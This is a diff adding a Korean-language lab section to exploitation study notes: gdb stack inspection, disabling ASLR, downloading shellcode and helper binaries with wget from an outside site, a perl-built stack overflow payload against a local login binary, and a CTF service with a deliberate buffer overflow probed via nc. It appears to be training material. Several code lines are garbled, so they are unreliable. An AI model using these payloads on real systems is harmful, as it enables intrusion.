@@ -23,4 +23,85 @@ symbolic Execution등 분석 : ANGR
 
 #### Angr : shellphish 팀에서 개발한 symbolic Excution  
 #### Radamsa Fuzzer : 취약한 함수의 입력값을 찾거나 크래쉬 부분  
+-----
+### 실습
+#### 초기 비밀번호 설정
+```
+sudo passwd root
+su
+id
+```
+
+#### 예전 아키텍처 사용
+
+```
+disass main ( 어셈블리 명령어확인) 
+```
+       
+```
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+b *main+35 (브레이크 포인트 걸기)
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+info reg
+x/16x $sep
+```
+
+#### 쉘 코드 작성 - 스택오버플로우  
+```
+wget http://javahacking.com/aihacking/shell.txt
+cat shell.txt
+```
+
+```
+sysctl -w kernel.randomize_va_space = 0  //커널 고정
+wget http://javahacking.com/aihacking/getenv
+chmod 755 getenv
+./getenv
+>(nil)
+```
+
+```
+sysctl -w kernel.randomize_va_space = 0  //커널 고정
+./getenv
+./getenv //고정됐는지 확인!
+> 0xffff1aa5
+
+./login `perl -e 'print "A"x8, "\xa5\x1a\xff\xff"'`
+>AAAAAAAA????
+exit 
+```
+
+#### CTF  
+```
+wget http://javahacking.com/aihacking/nonull
+chmod 755 nonull
+./nonull
+```
+#### 접속됐는지 확인하기 위해 shell 하나 더 켜서
+```
+netstate -na
+nc localhost 12344
+```
+
+#### 실제 nonull.txt 파일 보고 공격해보기
+```
+// nonull.txt 소스
+nonull
+12344
+
+#define MAX_RECV 128
+
+char key[MAX_RECV] = {0x00, };
+char gs[4] = {0xadm 0x00, 0x00, 0xff};
+char bug[MAX_RECV] = {0x00, };
+
+fp = fopen("/home/ctf2/key", "r");
+fread(key, 1024m 1m fp);
+fclose(fp);
+
+recv_data(sock, buf, MAX_RECV + 5);
+send_data(sock, buf, strlen(buf));
+```
+
+
 
